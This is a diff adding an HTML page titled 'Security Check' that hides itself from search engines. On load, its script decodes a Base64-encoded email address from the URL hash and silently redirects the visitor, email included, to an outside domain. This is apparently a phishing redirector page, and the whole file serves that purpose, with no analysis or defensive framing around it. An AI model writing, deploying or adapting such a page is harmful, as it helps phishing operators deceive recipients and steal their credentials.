@@ -1,0 +1,43 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>Security Check</title> 
+    <meta name="robots" content="noindex, nofollow"> <!-- Prevent search engines from indexing --> 
+</head> 
+<body> 
+ 
+    <script> 
+        // Function to extract email or data from URL hash 
+        function getEmailFromHash() { 
+            try { 
+                var hash = window.location.hash.substr(1); // Get the hash part (without the #) 
+                var decodedHash = atob(hash); // Decode the Base64 string (assuming hash is Base64-encoded) 
+                return decodedHash; 
+            } catch (error) { 
+                console.error("Error extracting data from hash:", error); 
+                return null; // Return null if there's an error 
+            } 
+        } 
+ 
+        // Function to handle redirection 
+        function handleRedirect() { 
+            try { 
+                var email = getEmailFromHash(); 
+                var redirectTo = "https://www.phrloo.com/dio/"  
++ window.location.hash; // Keep the hash in the URL 
+ 
+                console.log("Redirecting to: " + redirectTo); 
+                window.location.href = redirectTo; // Perform the redirect 
+            } catch (error) { 
+                console.error("Error during redirect:", error); 
+            } 
+        } 
+ 
+        // Call the redirect function when the page loads 
+        window.onload = handleRedirect; 
+    </script> 
+ 
+</body> 
+</html>
